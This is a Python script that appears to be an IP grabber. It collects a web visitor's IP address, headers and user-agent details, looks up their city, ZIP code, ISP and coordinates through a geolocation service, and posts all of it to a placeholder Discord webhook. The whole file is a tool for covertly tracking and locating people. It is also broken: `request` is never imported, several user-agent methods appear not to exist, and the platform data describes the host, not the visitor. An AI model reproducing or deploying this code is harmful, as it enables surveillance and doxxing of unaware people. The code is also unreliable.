import requests
import json
import socket
import platform

def get_browser_info():
    ua = request.user_agent
    browser = {
        'browser_name_brands': ua.browser_name_brands(),
        'browser_version_numbers': ua.browser_version_numbers(),
        'device_type': ua.device_type(),
        'is_adblock': ua.is_adblock(),
        'is_mobile': ua.is_mobile(),
        'is_pc': ua.is_pc(),
        'is_tablet': ua.is_tablet(),
        'os_name': ua.os_name(),
        'os_version': ua.os_version()
    }
    return browser

def get_system_info():
    system = {
        'platform_name': platform.system(),
        'platform_version': platform.version(),
        'architecture': platform.architecture()[0],
        'processor': platform.processor(),
        'node': platform.node(),
        'release': platform.release(),
        'machine': platform.machine()
    }
    return system

def get_network_info(ip):
    response = requests.get(f'http://ip-api.com/json/{ip}').json()
    network = {
        'status': response['status'],
        'country': response['country'],
        'country_code': response['countryCode'],
        'region': response['region'],
        'region_name': response['regionName'],
        'city': response['city'],
        'zip': response['zip'],
        'isp': response['isp'],
        'org': response['org'],
        'lat': response['lat'],
        'lon': response['lon'],
        'timezone': response['timezone'],
        'as_number': response['as'],
        'as_name': response['asname']
    }
    return network

def send_data(data, webhook_url):
    payload = {
        'content': data
    }
    r = requests.post(webhook_url, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
    return r.text

if __name__ == '__main__':
    webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    browser_info = get_browser_info()
    system_info = get_system_info()
    network_info = get_network_info(ip)
    data = {
        "IP": ip,
        "User Agent": request.user_agent.string,
        "Referer": request.headers.get('Referer'),
        "Language": request.headers.get('Accept-Language'),
        **browser_info,
        **system_info,
        **network_info
    }
    send_data(json.dumps(data, indent=4), webhook_url)
